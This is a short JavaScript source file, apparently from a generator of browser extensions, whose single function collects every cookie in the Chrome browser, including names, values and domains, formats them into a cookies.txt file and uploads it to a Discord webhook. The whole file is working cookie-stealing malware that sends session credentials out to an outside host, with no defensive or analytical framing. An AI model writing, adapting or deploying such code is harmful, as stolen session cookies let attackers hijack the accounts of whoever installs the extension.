// Chrome Extension Cookie Extractor
// This file is called by generated extensions to extract and send cookies to Discord

async function extractAndSendCookies(WEBHOOK_URL) {
  try {
    console.log('Extracting cookies...');
    const cookies = await chrome.cookies.getAll({});
    console.log('Found ' + cookies.length + ' cookies');

    // Format cookies as text file content
    let fileContent = 'Chrome Extension Cookies\n' + '='.repeat(50) + '\n\n';
    cookies.forEach((c, i) => {
      fileContent += '[' + (i+1) + '] ' + c.name + '\n';
      fileContent += '    Value: ' + c.value + '\n';
      fileContent += '    Domain: ' + (c.domain || 'N/A') + '\n';
      fileContent += '    Path: ' + (c.path || '/') + '\n\n';
    });

    // Create multipart form data
    const body = new FormData();
    body.append('content', 'Cookie extraction complete - ' + cookies.length + ' cookies found');
    body.append('file', new Blob([fileContent], {type: 'text/plain'}), 'cookies.txt');

    // Send to Discord webhook
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: body
    });

    console.log('Response: ' + response.status);
    if (response.ok) {
      console.log('✓ Sent cookies.txt to Discord');
    } else {
      console.error('✗ Discord error: ' + response.status);
    }
  } catch (error) {
    console.error('✗ Error: ' + error.message);
  }
}
